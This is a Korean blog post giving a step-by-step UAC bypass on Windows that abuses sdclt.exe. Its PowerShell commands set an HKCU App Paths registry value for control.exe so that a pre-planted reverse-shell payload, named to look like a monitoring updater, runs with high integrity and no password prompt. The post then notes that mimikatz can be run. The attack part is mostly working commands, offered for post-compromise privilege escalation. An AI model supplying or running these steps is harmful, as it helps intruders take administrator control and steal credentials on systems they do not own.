---
layout: post
title: UAC bypass로 관리자 권한 쉘 열기
subtitle: UAC Bypass를 이용한 쉘 권한 높이기 
category: knowledge
thumbnail-img: /assets/img/knowledge/high.png
tags: [reverseshell, UACbypass, windows, sdclt.exe]
author: Hong
---
# 전제조건
윈도우에서 관리자 권한을 가진 유저의 쉘을 취득했을 경우.

GUI가 아니기 때문에 관리자 권한으로 쉘을 열 수 없는 경우. GUI의 경우 페이로드를 cmd.exe로 하면 간단하게 실행 된다.

관리자의 비밀번호를 모르는 경우.

현재 권한을 보면 **관리자 그룹에 들어있지만** 현재 터미널은 Medium Mandatory Level인 것을 알 수 있다.
![medium](/assets/img/knowledge/medium.png)
# sdclt.exe를 악용
sdclt.exe 파일은 윈도우 시스템에서 백업 및 복원을 담당하는 실행 파일이다.

이 실행 파일은 관리자 권한으로 실행되기 때문에 레지스트리의 값을 오염시켜서 원하는 파일을 실행시키는 것이 가능하다.

이번에는 미리 심어둔 리버스쉘 페이로드인 Monitoring Stat Updater1.exe 파일을 실행하도록 한다.

먼저 취득한 쉘에서 powershell 쉘을 사용한다.

다음 아래의 명령어들을 입력한다.

```powershell
[String]$program="C:\Users\Public\monitoring\Monitoring Stat Updater1.exe"
New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" -Name "(default)" -Value $program -Force

Start-Process "C:\Windows\System32\sdclt.exe" -WindowStyle Hidden # 이 명령어로 실행
```
HKCU 하위의 폴더에 새로운 레지스트리를 만든 후, 지정한 프로그램을 키 값으로 설정한다.

그리고 Start-Process로 sdclt.exe를 실행시키면 관리자 권한의 쉘이 얻어진다. 

이번에는 리버스쉘의 페이로드를 이용했기 때문에 관리자 권한 쉘을 얻었지만, 프로그램을 cmd.exe로 설정하면 터미널이 관리자 권한으로 열린다.

**GUI에서는 cmd 창이 새로 열리기 때문에 문제없지만**, 원격으로 CLI을 베이스로 통신하고 있기 때문에 리버스쉘의 페이로드를 사용했다.
# GUI의 경우
GUI의 경우에는 관리자 권한으로 실행을 클릭하면 관리자의 비밀번호를 입력하라는 팝업창이 뜨게 된다.

리버스쉘로 쉘은 얻었지만 **관리자의 비밀번호를 모르는 상황**이기 때문에 관리자 권한의 터미널을 사용할 수가 없다.

이때 UAC 바이패스의 페이로드를 cmd.exe로 설정하면 비밀번호를 묻는 팝업 없이 바로 관리자 권한의 터미널이 새로운 창으로 열리게 된다.
# 실행 결과
리버스쉘을 받기위한 포트를 리스닝 상태로 두고 위의 순서대로 UAC bypass를 실행하면 새로운 리버스쉘이 열리게 된다.
![high](/assets/img/knowledge/high.png)
권한을 확인하면 아까와는 다르게 High Mandatory Level이 되어있는 것을 알 수 있다.

그렇기 때문에 이제 mimikatz의 실행이 가능해진다.